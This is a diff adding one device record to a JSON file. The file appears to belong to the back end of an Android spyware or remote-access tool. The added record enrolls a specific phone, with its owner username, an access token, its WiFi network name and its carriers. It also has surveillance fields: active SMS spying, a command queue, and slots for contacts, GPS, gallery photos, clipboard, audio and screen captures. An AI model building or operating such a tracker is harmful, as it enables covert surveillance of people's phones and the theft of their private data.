@@ -63,5 +63,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_1364b0f4",
+    "deviceName": "HP-ANJAY-779C",
+    "ownerUsername": "ziwoo",
+    "token": "36368bd19633c1fa3a42ada864eb9311",
+    "lastSeen": 1777618063100,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-01T06:47:43.100Z",
+    "deviceInfo": {
+      "model": "INFINIX Infinix X6525",
+      "androidVersion": "Android 13",
+      "battery": 93,
+      "network": "WiFi: AZISS",
+      "sim1": "XL Axiata",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
